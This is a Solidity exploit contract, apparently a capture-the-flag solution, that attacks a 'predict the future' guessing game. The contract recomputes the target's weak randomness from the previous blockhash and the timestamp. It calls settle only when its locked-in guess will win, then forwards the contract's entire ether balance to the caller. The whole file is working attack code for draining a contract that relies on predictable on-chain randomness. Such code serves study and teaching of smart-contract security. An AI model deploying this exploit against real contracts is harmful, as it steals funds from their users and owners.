// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IGuessPredict {
    function settle() external;

    function lockInGuess(uint8 n) external payable;
}

contract GuessPredictAttacker {
    IGuessPredict target;
    uint8 num;

    constructor(address _targetAddress) {
        target = IGuessPredict(_targetAddress);
    }

    function submit(uint8 _num) public payable {
        target.lockInGuess{value: msg.value}(_num);
        num = _num;
    }

    function settleAttacker() public {
        uint8 result = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
        console.log("CONTRACT::: num:", num);
        console.log("CONTRACT::: result:", result);

        require(result == num, "Wrong guess");
        target.settle();

        (bool success, ) = payable(msg.sender).call{
            value: address(this).balance
        }("");
        require(success, "Error sending ether");
    }

    receive() external payable {}
}
